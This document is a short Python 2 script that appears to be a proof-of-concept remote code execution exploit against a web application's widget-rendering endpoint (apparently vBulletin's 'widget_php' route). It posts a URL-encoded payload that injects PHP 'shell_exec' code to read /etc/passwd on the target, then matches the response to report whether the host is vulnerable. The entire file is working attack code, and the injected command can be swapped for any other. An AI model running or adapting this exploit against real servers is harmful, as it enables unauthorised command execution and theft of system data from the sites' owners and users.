import re
import requests
import sys
import os

if len(sys.argv) < 3:
        print 'Usage: python %s <dst_ip> <port>' % os.path.basename(sys.argv[0])
        sys.exit()
address =(sys.argv[1], sys.argv[2])
dst_addr=":".join(address)
print(dst_addr)
URL="http://"+dst_addr
data ={"routestring" : "ajax%2Frender%2Fwidget_php&widgetConfig%5Bcode%5D=%7B%27widgetConfig%5Bcode%5D%27%3A+%22echo+shell_exec%28%27cat+%2Fetc%2Fpasswd%27%29%3Bexit%3B%22%7D"}
res = requests.post(URL, data=data)
response = res.text

p = re.compile('.*:x:\d')
m = p.match(response)
print("Status Code : %d"% res.status_code)
if m:
        print("Vuln Found")
else:
        print("Not Found")
